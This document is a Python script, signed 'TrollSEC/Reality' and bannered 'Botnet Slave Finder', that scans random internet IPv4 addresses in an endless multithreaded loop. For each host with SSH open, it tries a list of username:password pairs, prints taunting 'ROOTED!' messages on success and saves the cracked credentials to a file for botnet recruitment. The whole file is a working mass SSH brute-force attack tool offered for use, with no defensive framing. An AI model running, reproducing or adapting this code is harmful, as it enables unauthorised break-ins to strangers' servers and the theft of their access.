import random
import socket
import paramiko
import threading
from colorama import *
import stem

print(Fore.BLUE + """
  _____        _ _ ___ ___ ___                 
 |_   _| _ ___| | / __| __/ __|                
   | || '_/ _ \ | \__ \ _| (__                 
  _|_||_| \___/_|_|___/___\___|                
 | _ ) ___| |_ _ _  ___| |_                    
 | _ \/ _ \  _| ' \/ -_)  _|                   
 |___/\___/\__|_||_\___|\__|         _         
 / __| |__ ___ _____  | __(_)_ _  __| |___ _ _ 
 \__ \ / _` \ V / -_) | _|| | ' \/ _` / -_) '_|
 |___/_\__,_|\_/\___| |_| |_|_||_\__,_\___|_|  
                  //Made by TrollSEC/Reality
""")
print(Style.RESET_ALL)
with open("passwords.txt") as f:
    credentials = [{"username": line.split(":")[0], "password": line.split(":")[1].strip()} for line in f]

def check_ssh(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((ip, 22))
        if result == 0:
            for cred in credentials:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=cred["username"], password=cred["password"], timeout=5)
                    ssh_methods = ssh.get_transport().get_auth_methods()
                    if "password" in ssh_methods:  
                        print(Fore.BLUE + ip + Fore.GREEN + ": ROOTED! #ripbozo #packwatch #ROOTEDBYTROLLSEC " + cred["username"] + ":" + cred["password"])
                        print(Style.RESET_ALL)
                        with open("equipos.txt", "a") as f:
                            f.write(ip + ":" + cred["username"] + ":" + cred["password"] + ":NS" + "\n")
                    ssh.close()
                    break
                except paramiko.ssh_exception.AuthenticationException:
                    print("[Not Rooted]", Fore.BLUE + ip + Fore.RED, " : ",  cred["username"] + ":" + cred["password"])
                    print(Style.RESET_ALL)
                    with open("fail_login.txt", "a") as f:
                        f.write(ip + ":" + cred["username"] + ":" + cred["password"] + ":NS" + "\n")
    except Exception as e:
        pass


def main_loop():
    while True:
        try:
            threads = []
            for i in range(20000): # generating & checks 20k ips (well idk if it actually makes 9k IPS so uh yea)
                ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                if not (ip.startswith("127.") or ip.startswith("10.") or ip.startswith("172.")):
                    t = threading.Thread(target=check_ssh, args=(ip,))
                    t.start()
                    threads.append(t)

            for t in threads:
                t.join()
        except Exception as e:
            print(e)

main_thread = threading.Thread(target=main_loop)
main_thread.start()